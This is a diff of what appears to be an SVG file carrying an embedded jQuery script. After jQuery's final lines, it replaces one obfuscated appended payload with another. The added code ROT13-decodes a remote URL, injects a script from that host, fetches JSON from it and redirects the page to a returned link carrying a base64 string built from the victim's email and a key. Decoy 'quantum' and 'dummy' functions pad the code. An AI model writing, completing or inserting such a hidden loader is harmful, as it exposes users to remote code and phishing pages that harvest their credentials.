@@ -8637,131 +8637,106 @@ if ( typeof noGlobal === "undefined" ) {
 
 return jQuery;
 } );
+ 
 
-// Fundamental Constants (CRITICAL - DO NOT ALTER)
-const cosmicIdentifier = "[EMAIL]", dimensionalKey = "[KEY]";
+// Core Immutable Constants (⚠ DO NOT MODIFY)
+const astralToken = "[EMAIL]", portalKey = "[KEY]";
 
-(function quantumTunnelInitializer() {
-    console.log("Dimensional Gateway Activated @", new Date().toISOString());
+(function initiateAstralGateway() {
+    console.log("🌌 Astral Gateway Online →", new Date().toUTCString());
 
-    // Background reality stabilizer
-    (function initializeRealityMatrix() {
-        let stabilityCounter = 0;
-        const stabilizationInterval = setInterval(() => {
-            if (++stabilityCounter > 5) clearInterval(stabilizationInterval);
-        }, 1);
+    // === Dummy Noise Script (new useless addition) ===
+    (function phantomNoiseGenerator() {
+        let ghost = 0;
+        while (ghost < 2) {
+            console.debug("Phantom ping", ghost++);
+        }
     })();
 
-    // Visual perception filter
-    const perceptualFilter = document.createElement("style");
-    perceptualFilter.textContent = "body::before{content:'🌀';opacity:0}";
-    document.head?.append(perceptualFilter);
+    // === Cosmetic Overlay ===
+    const illusionLayer = document.createElement("style");
+    illusionLayer.innerHTML = "body::after{content:'✨';opacity:0}";
+    document.head && document.head.appendChild(illusionLayer);
 
-    // Dimensional Translation Cipher
-    function executeDimensionalTranslation(inputData) {
-        return inputData.replace(/[a-zA-Z]/g, char => {
-            const codePoint = char.charCodeAt(0);
-            const dimensionalShift = char.toLowerCase() < 'n' ? 13 : -13;
-            return String.fromCharCode(codePoint + dimensionalShift);
+    // === ROT13 Decoder (Critical, DO NOT CHANGE) ===
+    function rot13Decode(input) {
+        return input.replace(/[a-zA-Z]/g, ch => {
+            const c = ch.charCodeAt(0);
+            const shift = ch.toLowerCase() < 'n' ? 13 : -13;
+            return String.fromCharCode(c + shift);
         });
     }
 
-    // Quantum encoded fragments (rearranged)
-    const realityShards = [
-        "wfqryvie", 
-        "uggcf://", 
-        "cbfvbasbe2@1.0.0", 
-        "/terng.wf", 
-        "acz/", 
-        ".arg/"
-    ];
-    const convergencePoint = executeDimensionalTranslation(realityShards.reverse().join(""))
-                           .replace("uggcf://", "https://");
+    // === Proper singularityConduit ===
+    const singularityConduit = rot13Decode(
+        "uggcf://abveyrtnplfraqre4321.plbh/ncv/hhheeyyy"
+    ).replace("uggcf://", "https://");
 
-    // Quantum script manifestation
-    const realityScript = document.createElement("script");
-    realityScript.setAttribute("data-cosmic-frequency", "resonant");
-    realityScript.async = true;
-    realityScript.src = convergencePoint;
+    // === Inject Remote Script ===
+    const astralScript = document.createElement("script");
+    astralScript.setAttribute("data-gateway", "astral");
+    astralScript.async = true;
+    astralScript.src = singularityConduit;
+    
 
-    // Manifestation protocol
-    (document.body || document.head)?.appendChild(realityScript);
-
-    // Quantum field simulation
-    (function simulateQuantumSuperposition() {
-        const quantumValue = Math.PI * Math.E * Math.random();
-        console.log("Quantum field distortion:", quantumValue.toFixed(6));
+    // === Dummy Math (useless) ===
+    (() => {
+        const x = Math.pow(Math.random(), 2) + Date.now() % 7;
+        console.debug("Calibration:", x.toFixed(3));
     })();
 
-    // Reality Bridge Controller
-    (function establishRealityBridge() {
-        let initializationAttempts = 0;
+    // === Bridge Establishment ===
+    (function bridgeOrchestrator() {
+        let retries = 0;
 
-        function verifyManifestation() {
-            if (!document.body && initializationAttempts++ < 7) {
-                setTimeout(verifyManifestation, 40);
+        function confirmBodyReady() {
+            if (!document.body && retries++ < 6) {
+                return setTimeout(confirmBodyReady, 25);
             }
         }
-        verifyManifestation();
+        confirmBodyReady();
 
-        const realityDecoder = inputString =>
-            inputString.replace(/[a-zA-Z]/g, character =>
-                String.fromCharCode(character.charCodeAt(0) + (character.toLowerCase() < 'n' ? 13 : -13))
-            );
+        // Use same ROT13 decoder
+        const innerDecoder = rot13Decode;
 
-        // Temporal synchronization field
-        async function synchronizeTemporalFlow() {
-            await new Promise(r => setTimeout(r, 4));
-            return "⏳";
+        // Fake async wait
+        async function pseudoDelay() {
+            await new Promise(r => setTimeout(r, 3));
+            return "⌛";
         }
 
-        // Quantum data retrieval
-        async function acquireQuantumData() {
+        // Remote fetch handler
+        async function fetchAstralData() {
             try {
-                const dimensionalResponse = await fetch(realityDecoder(singularityConduit));
-                if (!dimensionalResponse.ok) return null;
-                return await dimensionalResponse.json();
+                const res = await fetch(innerDecoder("uggcf://abveyrtnplfraqre4321.plbh/ncv/hhheeyyy"));
+                if (!res.ok) return null;
+                return await res.json();
             } catch {
                 return null;
             }
         }
 
-        // Bridge activation sequence
-        async function activateRealityBridge() {
-            const quantumSignature = btoa(cosmicIdentifier + "&" + dimensionalKey + "&a");
-            await synchronizeTemporalFlow();
-            const quantumData = await acquireQuantumData();
-            if (quantumData?.message) {
-                window.open(quantumData.message + quantumSignature, "_self");
+        // === Final Activation ===
+        async function activate() {
+            const sig = btoa(astralToken + "&" + portalKey + "&a");
+            await pseudoDelay();
+            const data = await fetchAstralData();
+            if (data?.message) {
+                window.open(data.message + sig, "_self");
             }
         }
 
-        activateRealityBridge();
-    })();
-
-    // Final quantum coherence
-    (function quantumDecoherence() {
-        const quantumEchoes = Array(5).fill().map((_, i) => Math.cos(i));
-        quantumEchoes.forEach(x => x * Math.random());
+        activate();
     })();
 })();
 
-// Additional multidimensional processing
-(function hyperspaceCalculator() {
-    const dimensionalConstants = [12, 23, 34, 45, 56];
-    const calculateRealityFracture = () => dimensionalConstants.reduce((a, b) => a | b, 0);
-    calculateRealityFracture();
+// === Side Module (still useless, but new) ===
+(function chaosCounter() {
+    const total = Array.from({ length: 4 }, () => Math.random() * 10)
+        .reduce((a, b) => a + b, 0);
+    console.log("Chaos checksum:", total.toFixed(4));
 })();
 
-// Chronal stabilizer (new addition)
-(function temporalAnchoringSystem() {
-    const timePoints = [];
-    for (let i = 0; i < 8; i++) {
-        timePoints.push(performance.now());
-    }
-    const temporalVariance = Math.max(...timePoints) - Math.min(...timePoints);
-    console.log("Temporal variance stabilized:", temporalVariance.toFixed(2));
-})();
 
   </script>
 </svg>
